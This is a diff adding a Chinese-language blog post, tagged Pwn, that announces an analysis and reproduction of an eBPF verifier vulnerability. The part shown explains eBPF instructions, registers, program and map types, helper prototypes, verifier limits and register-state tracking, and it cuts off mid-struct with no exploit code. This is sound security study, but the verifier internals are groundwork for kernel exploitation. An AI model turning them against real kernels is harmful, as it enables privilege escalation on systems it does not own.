@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ebpf-verifier | 晚栀wingee~</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="引言： eBPF-verifier模块原理分析与漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ebpf-verifier">
+<meta property="og:url" content="http://47.96.29.144/2025/06/22/ebpf-verifier/index.html">
+<meta property="og:site_name" content="晚栀wingee~">
+<meta property="og:description" content="引言： eBPF-verifier模块原理分析与漏洞复现">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250527202117034.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529152113973.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529152249612.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529152422005.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529152554000.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529154907564.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250608232602972.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250608232615823.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250604194130520.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250604200540447.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250604203807422.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250604205005425.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250607191128339.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250607200527678.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529184622149.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529190630046.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250529185935192.png">
+<meta property="article:published_time" content="2025-06-22T07:04:08.000Z">
+<meta property="article:modified_time" content="2025-06-22T07:12:48.855Z">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="eBPF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://47.96.29.144/2025/06/22/ebpf-verifier/image-20250527202117034.png">
+  
+    <link rel="alternative" href="/atom.xml" title="晚栀wingee~" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/poetry/poeting">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+							<li><a href="/tags">Tags</a></li>
+				        
+							<li><a href="/introduction">About me</a></li>
+				        
+							<li><a href="/poetry">Winegee的书房</a></li>
+				        
+							<li><a href="/log">Maintenance log</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+					        
+						</div>
+						<!-- music -->
+						
+							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
+							<div style="position: absolute; left: auto; width: 85%;">
+								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1805347343&auto=1&height=66"></iframe>
+							</div>
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BeginCTF/" style="font-size: 10px;">BeginCTF</a> <a href="/tags/CAN-IDS/" style="font-size: 10px;">CAN-IDS</a> <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/MoeCTF/" style="font-size: 10px;">MoeCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 12px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 12px;">ZJUCTF</a> <a href="/tags/eBPF/" style="font-size: 10px;">eBPF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E7%90%86%E8%AE%BA/" style="font-size: 10px;">信息理论</a> <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" style="font-size: 12px;">堆利用</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 10px;">安洵杯</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 10px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 14px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 16px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 12px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 18px;">计算机系统II</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91/" style="font-size: 10px;">车联网</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjuccnocc.github.io/Home">CCnocc</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好标题</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjulwind.github.io/home/">ZY老师</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">aaa</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/poetry/poeting">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+					<li><a href="/tags">Tags</a></li>
+		        
+					<li><a href="/introduction">About me</a></li>
+		        
+					<li><a href="/poetry">Winegee的书房</a></li>
+		        
+					<li><a href="/log">Maintenance log</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-ebpf-verifier" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/06/22/ebpf-verifier/" class="article-date">
+  	<time datetime="2025-06-22T07:04:08.000Z" itemprop="datePublished">2025-06-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ebpf-verifier
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/eBPF/" rel="tag">eBPF</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<h3 id="引言">引言：</h3>
+<p>eBPF-verifier模块原理分析与漏洞复现</p>
+<span id="more"></span>
+<h2 id="ebpf-漏洞相关知识">1 eBPF 漏洞相关知识</h2>
+<p>eBPF (Extended Berkeley Packet Filter) 由 cBPF (Classic Berkeley Packet Filter) 衍生而来，是一项可在内核虚拟机中运行程序的技术。使用eBPF无需修改内核源码，或者插入驱动，对系统的入侵性相对没那么强，可以安全并有效地扩展内核的功能。</p>
+<h3 id="ebpf指令">1.1 eBPF指令</h3>
+<p>eBPF 使用类似 x86 的虚拟机指令，基础指令为 8 字节，其编码格式为：</p>
+<table>
+<thead>
+<tr class="header">
+<th>32 bits (MSB)</th>
+<th>16 bits</th>
+<th>4 bits</th>
+<th>4 bits</th>
+<th>8 bits (LSB)</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>immediate</td>
+<td>offset</td>
+<td>source register</td>
+<td>destination register</td>
+<td>opcode</td>
+</tr>
+</tbody>
+</table>
+<p>扩展指令在基础指令基础上增加 8 个字节的立即数，总长度为 16 字节。</p>
+<p>伪指令是内核代码中定义的方便理解记忆的助记符，通常是对真实指令的包装。</p>
+<p>下文中出现的指令/伪指令及其功能如下：</p>
+<table>
+<thead>
+<tr class="header">
+<th>指令/伪指令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>BPF_MOV64_REG(DST, SRC)</code></td>
+<td><code>dst = src</code></td>
+</tr>
+<tr class="even">
+<td><code>BPF_MOV64_IMM(DST, IMM)</code></td>
+<td><code>dst_reg = imm32</code></td>
+</tr>
+<tr class="odd">
+<td><code>BPF_ST_MEM(SIZE, DST, OFF, IMM)</code></td>
+<td><code>*(uint *) (dst_reg + off16) = imm32</code></td>
+</tr>
+<tr class="even">
+<td><code>BPF_STX_MEM(SIZE, DST, SRC, OFF)</code></td>
+<td><code>*(uint *) (dst_reg + off16) = src_reg</code></td>
+</tr>
+<tr class="odd">
+<td><code>BPF_LDX_MEM(SIZE, DST, SRC, OFF)</code></td>
+<td><code>dst_reg = *(uint *) (src_reg + off16)</code></td>
+</tr>
+<tr class="even">
+<td><code>BPF_ALU64_IMM(OP, DST, IMM)</code></td>
+<td><code>dst_reg = dst_reg 'op' imm32</code></td>
+</tr>
+<tr class="odd">
+<td><code>BPF_JMP_IMM(OP, DST, IMM, OFF)</code></td>
+<td><code>if (dst_reg 'op' imm32) goto pc + off16</code></td>
+</tr>
+<tr class="even">
+<td><code>BPF_LD_MAP_FD(DST, MAP_FD)</code></td>
+<td><code>dst = map_fd</code></td>
+</tr>
+<tr class="odd">
+<td><code>BPF_EXIT_INSN()</code></td>
+<td><code>exit</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="ebpf寄存器">1.2 eBPF寄存器</h3>
+<p>eBPF 共有 11 个寄存器，其中 R10 是只读的帧指针，剩余 10 个是通用寄存器。</p>
+<ul>
+<li><strong>R0</strong>: 保存函数返回值，及 eBPF 程序退出值</li>
+<li><strong>R1 - R5</strong>: 传递函数参数，调用函数保存</li>
+<li><strong>R6 - R9</strong>: 被调用函数保存</li>
+<li><strong>R10</strong>: 只读的帧指针</li>
+</ul>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250527202117034.png" alt><figcaption>image-20250527202117034</figcaption>
+</figure>
+<h3 id="ebpf程序类型">1.3 eBPF程序类型</h3>
+<p>所有 eBPF 程序类型定义在以下枚举类型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> {</span></span><br><span class="line">	BPF_PROG_TYPE_UNSPEC = <span class="number">0</span>,</span><br><span class="line">	BPF_PROG_TYPE_SOCKET_FILTER = <span class="number">1</span>,</span><br><span class="line">	BPF_PROG_TYPE_KPROBE = <span class="number">2</span>,</span><br><span class="line">	BPF_PROG_TYPE_SCHED_CLS = <span class="number">3</span>,</span><br><span class="line">	BPF_PROG_TYPE_SCHED_ACT = <span class="number">4</span>,</span><br><span class="line">	BPF_PROG_TYPE_TRACEPOINT = <span class="number">5</span>,</span><br><span class="line">	BPF_PROG_TYPE_XDP = <span class="number">6</span>,</span><br><span class="line">	BPF_PROG_TYPE_PERF_EVENT = <span class="number">7</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SKB = <span class="number">8</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCK = <span class="number">9</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_IN = <span class="number">10</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_OUT = <span class="number">11</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_XMIT = <span class="number">12</span>,</span><br><span class="line">	BPF_PROG_TYPE_SOCK_OPS = <span class="number">13</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_SKB = <span class="number">14</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_DEVICE = <span class="number">15</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_MSG = <span class="number">16</span>,</span><br><span class="line">	BPF_PROG_TYPE_RAW_TRACEPOINT = <span class="number">17</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCK_ADDR = <span class="number">18</span>,</span><br><span class="line">	BPF_PROG_TYPE_LWT_SEG6LOCAL = <span class="number">19</span>,</span><br><span class="line">	BPF_PROG_TYPE_LIRC_MODE2 = <span class="number">20</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_REUSEPORT = <span class="number">21</span>,</span><br><span class="line">	BPF_PROG_TYPE_FLOW_DISSECTOR = <span class="number">22</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SYSCTL = <span class="number">23</span>,</span><br><span class="line">	BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE = <span class="number">24</span>,</span><br><span class="line">	BPF_PROG_TYPE_CGROUP_SOCKOPT = <span class="number">25</span>,</span><br><span class="line">	BPF_PROG_TYPE_TRACING = <span class="number">26</span>,</span><br><span class="line">	BPF_PROG_TYPE_STRUCT_OPS = <span class="number">27</span>,</span><br><span class="line">	BPF_PROG_TYPE_EXT = <span class="number">28</span>,</span><br><span class="line">	BPF_PROG_TYPE_LSM = <span class="number">29</span>,</span><br><span class="line">	BPF_PROG_TYPE_SK_LOOKUP = <span class="number">30</span>,</span><br><span class="line">	BPF_PROG_TYPE_SYSCALL = <span class="number">31</span>,</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
+<p>下文涉及到的类型只有 <code>BPF_PROG_TYPE_SOCKET_FILTER</code>。该类型 eBPF 程序通过 <code>setsockopt</code> 附加到指定 socket 上面，对 socket 的流量进行追踪、过滤，可附加的 socket 类型包括 UNIX socket。</p>
+<p>该类型程序的传入参数为结构体 <code>__sk_buff</code> 指针，可通过调用 <code>bpf_skb_load_bytes_relative</code> 辅助函数经由该结构体获取 socket 流量。</p>
+<h3 id="ebpf-map">1.4 eBPF map</h3>
+<p>eBPF map 是 eBPF 程序和用户态进行数据交换的媒介。其类型包括：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> {</span></span><br><span class="line">	BPF_MAP_TYPE_UNSPEC = <span class="number">0</span>,</span><br><span class="line">	BPF_MAP_TYPE_HASH = <span class="number">1</span>,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY = <span class="number">2</span>,</span><br><span class="line">	BPF_MAP_TYPE_PROG_ARRAY = <span class="number">3</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERF_EVENT_ARRAY = <span class="number">4</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_HASH = <span class="number">5</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_ARRAY = <span class="number">6</span>,</span><br><span class="line">	BPF_MAP_TYPE_STACK_TRACE = <span class="number">7</span>,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_ARRAY = <span class="number">8</span>,</span><br><span class="line">	BPF_MAP_TYPE_LRU_HASH = <span class="number">9</span>,</span><br><span class="line">	BPF_MAP_TYPE_LRU_PERCPU_HASH = <span class="number">10</span>,</span><br><span class="line">	BPF_MAP_TYPE_LPM_TRIE = <span class="number">11</span>,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY_OF_MAPS = <span class="number">12</span>,</span><br><span class="line">	BPF_MAP_TYPE_HASH_OF_MAPS = <span class="number">13</span>,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP = <span class="number">14</span>,</span><br><span class="line">	BPF_MAP_TYPE_SOCKMAP = <span class="number">15</span>,</span><br><span class="line">	BPF_MAP_TYPE_CPUMAP = <span class="number">16</span>,</span><br><span class="line">	BPF_MAP_TYPE_XSKMAP = <span class="number">17</span>,</span><br><span class="line">	BPF_MAP_TYPE_SOCKHASH = <span class="number">18</span>,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_STORAGE = <span class="number">19</span>,</span><br><span class="line">	BPF_MAP_TYPE_REUSEPORT_SOCKARRAY = <span class="number">20</span>,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE = <span class="number">21</span>,</span><br><span class="line">	BPF_MAP_TYPE_QUEUE = <span class="number">22</span>,</span><br><span class="line">	BPF_MAP_TYPE_STACK = <span class="number">23</span>,</span><br><span class="line">	BPF_MAP_TYPE_SK_STORAGE = <span class="number">24</span>,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP_HASH = <span class="number">25</span>,</span><br><span class="line">	BPF_MAP_TYPE_STRUCT_OPS = <span class="number">26</span>,</span><br><span class="line">	BPF_MAP_TYPE_RINGBUF = <span class="number">27</span>,</span><br><span class="line">	BPF_MAP_TYPE_INODE_STORAGE = <span class="number">28</span>,</span><br><span class="line">	BPF_MAP_TYPE_TASK_STORAGE = <span class="number">29</span>,</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
+<p>下文使用到的类型包括 <code>BPF_MAP_TYPE_ARRAY</code> 和 <code>BPF_MAP_TYPE_RINGBUF</code>。</p>
+<ul>
+<li><strong>BPF_MAP_TYPE_ARRAY</strong>: 顾名思义，类似数组，索引为整形，值可为任意长度的内存对象。</li>
+<li><strong>BPF_MAP_TYPE_RINGBUF</strong>: 环形缓冲区，如果写入的数据来不及读取，导致积累的数据超过缓冲区长度，新数据则会覆盖掉旧数据。</li>
+</ul>
+<p>bpf_map是用户态空间与内核空间进行数据交换的桥梁，下文的很多操作都是围绕<code>bpf_map</code>进行展开的。</p>
+<h3 id="ebpf辅助函数">1.5 eBPF辅助函数</h3>
+<p>eBPF 辅助函数（eBPF helper）是可在 eBPF 程序中使用的辅助函数。</p>
+<p>内核规定了不同类型的eBPF程序可使用哪些辅助函数，比如，<code>bpf_skb_load_bytes_relative</code> 只有 socket 相关的 eBPF 程序可使用。</p>
+<p>各 eBPF 辅助函数的函数原型由内核定义，下文使用到的一些辅助函数的原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_lookup_elem_proto</span> =</span> {</span><br><span class="line">	.func		= bpf_map_lookup_elem,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.pkt_access	= <span class="literal">true</span>,</span><br><span class="line">	.ret_type	= RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="line">	.arg1_type	= ARG_CONST_MAP_PTR,</span><br><span class="line">	.arg2_type	= ARG_PTR_TO_MAP_KEY,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_ringbuf_reserve_proto</span> =</span> {</span><br><span class="line">	.func		= bpf_ringbuf_reserve,</span><br><span class="line">	.ret_type	= RET_PTR_TO_ALLOC_MEM_OR_NULL,</span><br><span class="line">	.arg1_type	= ARG_CONST_MAP_PTR,</span><br><span class="line">	.arg2_type	= ARG_CONST_ALLOC_SIZE_OR_ZERO,</span><br><span class="line">	.arg3_type	= ARG_ANYTHING,</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
+<p>可见 <code>bpf_map_lookup_elem</code> 的返回值类型是 <code>RET_PTR_TO_MAP_VALUE_OR_NULL</code>，<code>bpf_ringbuf_reserve</code> 的返回值类型是 <code>RET_PTR_TO_ALLOC_MEM_OR_NULL</code>。</p>
+<p>各 eBPF 辅助函数的功能可通过 <code>man bpf-helpers</code> 命令查看。</p>
+<h3 id="ebpf-verifier">1.6 eBPF verifier</h3>
+<p>eBPF 程序在加载进内核之前，必须通过 eBPF verifier 的检查。只有符合要求的 eBPF 程序才允许被加载进内核，这是为了防止 eBPF 程序对内核进行破坏。</p>
+<p>eBPF verifier 对 eBPF 程序的限制包括：</p>
+<ol type="1">
+<li><strong>函数调用限制</strong>: 不能调用任意的内核函数，只限于内核模块中列出的 eBPF helper 函数</li>
+<li><strong>代码有效性</strong>: 不允许包含无法到达的指令，防止加载无效代码，延迟程序的终止</li>
+<li><strong>循环限制</strong>: 限制循环次数，必须在有限次内结束</li>
+<li><strong>栈大小限制</strong>: 栈大小被限制为 <code>MAX_BPF_STACK</code>，<strong>截止到内核 5.10.83 版本</strong>，被设置为 512</li>
+<li><strong>复杂度限制</strong>: 限制 eBPF 程序的复杂度，verifier 处理的指令数不得超过 <code>BPF_COMPLEXITY_LIMIT_INSNS</code>，截止到内核 5.10.83 版本，被设置为100万</li>
+<li><strong>内存访问限制</strong>: <strong>限制 eBPF 程序对内存的访问，比如不得访问未初始化的栈，不得越界访问 eBPF map</strong></li>
+</ol>
+<p>在<code>verifier</code>进行<code>bpf</code>程序验证过程中，会对每个寄存器维持一个结构体，用于描述每个寄存器现在的状态：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ptype <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">        u16 range;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">        u32 btf_id;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> raw;</span><br><span class="line">    };</span><br><span class="line">    s32 off;</span><br><span class="line">    u32 id;</span><br><span class="line">    u32 ref_obj_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span></span><br><span class="line">    s64 smin_value;<span class="comment">//有符号时可能的最小值</span></span><br><span class="line">    s64 smax_value;<span class="comment">//有符号时可能的最大值</span></span><br><span class="line">    u64 umin_value;</span><br><span class="line">    u64 umax_value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">    u32 frameno;</span><br><span 